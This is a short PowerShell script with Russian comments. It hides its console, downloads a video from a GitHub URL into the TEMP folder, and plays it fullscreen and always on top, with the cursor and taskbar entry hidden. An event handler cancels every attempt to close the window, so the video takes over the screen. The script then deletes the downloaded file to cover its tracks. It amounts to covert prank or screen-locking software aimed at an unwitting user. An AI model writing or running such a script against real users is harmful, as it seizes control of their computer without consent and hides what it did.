# 1. Принудительное скрытие консоли
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# 2. ФИКСИРОВАННЫЕ ПУТИ
$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/assets/edit.mp4'
$f = "$env:TEMP\payload_video.mp4"

try {
    # Скачиваем файл (флаг -Force позволяет перезаписать старый файл, если он есть)
    Invoke-WebRequest -Uri $u -OutFile $f -ErrorAction Stop

    # Проверка, что файл не пустой
    if ((Get-Item $f).Length -lt 100) { exit }

    # 3. ИНТЕРФЕЙС ПЛЕЕРА
    [xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader $xaml
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # Автозакрытие и защита
    $v.add_MediaEnded({ $w.Close() })
    $w.Add_Closing({ $_.Cancel = $true })

    $w.ShowDialog() | Out-Null
} 
catch {
    # Если скачивание не удалось, пытаемся запустить то, что уже есть в TEMP
    if (Test-Path $f) {
        $reader = New-Object System.Xml.XmlNodeReader ([xml]$xaml)
        $w = [Windows.Markup.XamlReader]::Load($reader)
        $w.ShowDialog() | Out-Null
    }
}
finally {
    # 4. ПОЛНАЯ ОЧИСТКА
    Start-Sleep -Seconds 1
    if (Test-Path $f) { 
        Remove-Item $f -Force -ErrorAction SilentlyContinue 
    }
}
